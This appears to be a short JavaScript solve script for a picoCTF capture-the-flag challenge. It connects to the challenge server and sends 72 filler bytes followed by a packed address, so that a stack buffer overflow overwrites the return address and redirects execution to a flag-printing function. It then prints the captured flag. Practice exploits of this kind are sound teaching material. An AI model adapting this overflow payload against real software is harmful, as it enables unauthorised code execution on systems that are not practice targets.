import nc from "../nc.js";
import convo from "../convo.js"
import { expectArg } from "../util.js";

const port = expectArg(2, "port") - 0;

const cat = new nc("saturn.picoctf.net", port);

const STACK_SIZE = 72;
const flag_fn_addr = 0x040123bn;

await cat.write("A".repeat(STACK_SIZE));
await cat.write(convo.raw([flag_fn_addr]))
await cat.write("\n");

await cat.readUntil("picoCTF");
const flag = "picoCTF" + await cat.readUntil("}");

console.log("[!] " + flag.trim());

await cat.kill();